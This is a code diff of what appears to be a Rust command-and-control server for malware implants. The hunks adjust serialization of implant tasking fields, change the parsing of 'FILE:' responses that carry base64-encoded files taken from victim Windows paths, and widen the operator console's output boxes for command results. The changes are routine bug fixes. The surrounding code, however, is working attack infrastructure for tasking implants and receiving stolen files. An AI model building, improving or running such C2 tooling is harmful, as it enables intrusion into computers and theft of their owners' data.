@@ -101,10 +101,10 @@ struct TaskResponse {
     /// Rolling request ID; implant must echo this on the next call.
     x_request_id: String,
     /// For backward compatibility during transition
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "String::is_empty")]
     q: String,
     /// For backward compatibility during transition
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "String::is_empty")]
     tasking: String,
     /// For backward compatibility during transition
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -139,13 +139,12 @@ fn cookie_ok(req: &HttpRequest) -> bool {
 }
 
 fn parse_file_response(response: &str) -> Option<(String, String)> {
-    if response.starts_with("FILE:") {
-        let parts: Vec<&str> = response.splitn(3, ':').collect();
-        if parts.len() == 3 {
-            return Some((parts[1].to_string(), parts[2].to_string()));
-        }
-    }
-    None
+    // Format: FILE:<path>:<base64_content>
+    // Use rfind(':') because Windows paths contain ':' (e.g. C:\Users\…).
+    // Base64 never contains ':', so the last ':' is always the path/content separator.
+    let rest = response.strip_prefix("FILE:")?;
+    let sep = rest.rfind(':')?;
+    Some((rest[..sep].to_string(), rest[sep + 1..].to_string()))
 }
 
 // ── Input validation ─────────────────────────────────────────────────────────
@@ -421,20 +420,21 @@ pub async fn stage3_handler(
 
     // Print to console outside the lock.
     if let Some((link_name, cli_cmd, output)) = ui_message {
-        const OUTPUT_BOX_WIDTH: usize = 54;
+        const MIN_BOX_WIDTH: usize = 54;
         let now = chrono::Local::now().format("%H:%M:%S");
         let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
-        let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
+        let box_width = header_text.chars().count().max(MIN_BOX_WIDTH);
+        let pad = box_width - header_text.chars().count();
         crate::ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
         crate::ui::print(&format!("║ {}", output));
-        crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)));
+        crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
         tracing::info!(
             "\n{}\n{}\n{}",
             format!("╔{}{}╗", header_text, "═".repeat(pad))
                 .cyan()
                 .bold(),
             output,
-            format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold(),
+            format!("╚{}╝", "═".repeat(box_width)).cyan().bold(),
         );
     }
 
